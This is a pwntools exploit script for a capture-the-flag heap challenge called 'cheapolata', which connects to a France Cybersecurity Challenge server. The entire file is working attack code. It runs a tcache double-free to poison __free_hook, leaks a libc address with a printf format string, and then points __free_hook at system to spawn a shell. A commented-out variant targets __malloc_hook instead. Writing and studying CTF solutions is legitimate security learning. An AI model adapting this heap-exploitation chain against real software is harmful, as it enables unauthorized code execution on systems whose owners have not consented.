#!/usr/bin/env python3

from pwn import *

exe = ELF("./cheapolata_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("challenges.france-cybersecurity-challenge.fr", 2106)

    return r

def malloc_(size, cnt):
    r.sendline(b'1')
    sleep(0.1)
    r.sendline(str(size).encode())
    sleep(0.1)
    r.sendline(cnt)
    sleep(0.1)

def free_():
    r.sendline(b'2')
    sleep(0.1)
    
r = conn()
pause()
malloc_(0x10, b'A')
free_()
free_()

malloc_(0x28, b'A')
free_()
free_()
malloc_(0x28, p64(exe.sym.__free_hook))
malloc_(0x28, p64(exe.sym.__free_hook))
malloc_(0x28, p64(exe.plt.printf))

malloc_(0x40, b'%23$p')

free_()

libc.address = int(r.recvuntil(b'97')[-14:], 16) - 0x21b97

print(hex(libc.address))

# malloc_(0x10, p64(libc.sym.__malloc_hook))
# malloc_(0x10, p64(0))
# malloc_(0x10, p64(libc.address+0x10a38c))
# malloc_(0x10, b'gg')

# way 2
malloc_(0x10, p64(exe.sym.__free_hook))
malloc_(0x10, p64(0))
malloc_(0x10, p64(libc.sym.system))

malloc_(0x40, b'/bin/sh\0')
free_()


r.interactive()


